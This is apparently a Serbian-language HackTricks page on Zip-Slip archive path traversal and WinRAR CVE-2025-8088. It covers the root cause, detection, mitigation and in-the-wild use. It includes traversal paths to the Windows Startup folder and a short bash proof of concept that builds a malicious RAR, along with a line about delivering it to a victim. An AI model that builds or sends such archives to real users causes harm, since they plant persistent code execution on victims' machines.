# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi formati arhiva (ZIP, RAR, TAR, 7-ZIP, itd.) omogućavaju svakom unosu da nosi svoj **interni put**. Kada alat za ekstrakciju slepo poštuje taj put, kreirano ime datoteke koje sadrži `..` ili **apsolutni put** (npr. `C:\Windows\System32\`) biće zapisano izvan direktorijuma koji je korisnik odabrao. Ova klasa ranjivosti je široko poznata kao *Zip-Slip* ili **prolaz kroz put ekstrakcije arhive**.

Posledice se kreću od prepisivanja proizvoljnih datoteka do direktnog postizanja **daljinskog izvršavanja koda (RCE)** tako što se isporučuje payload na **auto-run** lokaciju kao što je Windows *Startup* folder.

## Osnovni uzrok

1. Napadač kreira arhivu gde jedan ili više zaglavlja datoteka sadrže:
* Relativne sekvence prolaza (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Apsolutne puteve (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Žrtva ekstraktuje arhivu pomoću ranjivog alata koji veruje ugrađenom putu umesto da ga sanitizuje ili primora ekstrakciju ispod odabranog direktorijuma.
3. Datoteka se zapisuje na lokaciju koju kontroliše napadač i izvršava/učitava se sledeći put kada sistem ili korisnik aktivira taj put.

## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR za Windows (uključujući `rar` / `unrar` CLI, DLL i prenosivi izvor) nije uspeo da validira imena datoteka tokom ekstrakcije. Zlonamerna RAR arhiva koja sadrži unos kao:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
bi završio **izvan** odabranog izlaznog direktorijuma i unutar korisničkog *Startup* foldera. Nakon prijavljivanja, Windows automatski izvršava sve što se tamo nalazi, pružajući *persistent* RCE.

### Izrada PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opcije korišćene:
* `-ep`  – čuvanje putanja fajlova tačno onako kako su date (ne **pruning** vodeće `./`).

Dostavite `evil.rar` žrtvi i uputite ih da ga izvade koristeći ranjivu verziju WinRAR-a.

### Posmatrana Eksploatacija u Prirodi

ESET je izvestio o RomCom (Storm-0978/UNC2596) spear-phishing kampanjama koje su priložile RAR arhive koristeći CVE-2025-8088 za implementaciju prilagođenih backdoor-a i olakšavanje operacija ransomware-a.

## Saveti za Detekciju

* **Statistička inspekcija** – Nabrojati stavke arhive i označiti bilo koje ime koje sadrži `../`, `..\\`, *apsolutne putanje* (`C:`) ili nekanonske UTF-8/UTF-16 kodiranja.
* **Sandbox ekstrakcija** – Dekompresovati u jednokratni direktorij koristeći *siguran* ekstraktor (npr., Python-ov `patool`, 7-Zip ≥ najnovija verzija, `bsdtar`) i proveriti da li rezultantne putanje ostaju unutar direktorijuma.
* **Praćenje krajnjih tačaka** – Upozoriti na nove izvršne fajlove napisane u `Startup`/`Run` lokacije ubrzo nakon što je arhiva otvorena od strane WinRAR/7-Zip/etc.

## Ublažavanje i Ojačavanje

1. **Ažurirajte ekstraktor** – WinRAR 7.13 implementira pravilnu sanitizaciju putanja. Korisnici ga moraju ručno preuzeti jer WinRAR nema mehanizam za automatsko ažuriranje.
2. Ekstraktujte arhive sa **“Ignoriši putanje”** opcijom (WinRAR: *Ekstrakt → "Ne ekstraktuj putanje"*) kada je to moguće.
3. Otvorite nepouzdane arhive **unutar sandbox-a** ili VM-a.
4. Implementirajte beleženje aplikacija i ograničite pristup korisnika za pisanje u auto-radne direktorijume.

## Dodatni Pogođeni / Istorijski Slučajevi

* 2018 – Masivno *Zip-Slip* upozorenje od strane Snyk-a koje utiče na mnoge Java/Go/JS biblioteke.
* 2023 – 7-Zip CVE-2023-4011 slična eksploatacija tokom `-ao` spajanja.
* Bilo koja prilagođena logika ekstrakcije koja ne poziva `PathCanonicalize` / `realpath` pre pisanja.

## Reference

- [BleepingComputer – WinRAR zero-day iskorišćen za postavljanje malvera prilikom ekstrakcije arhive](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip ranjivost izveštaj](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
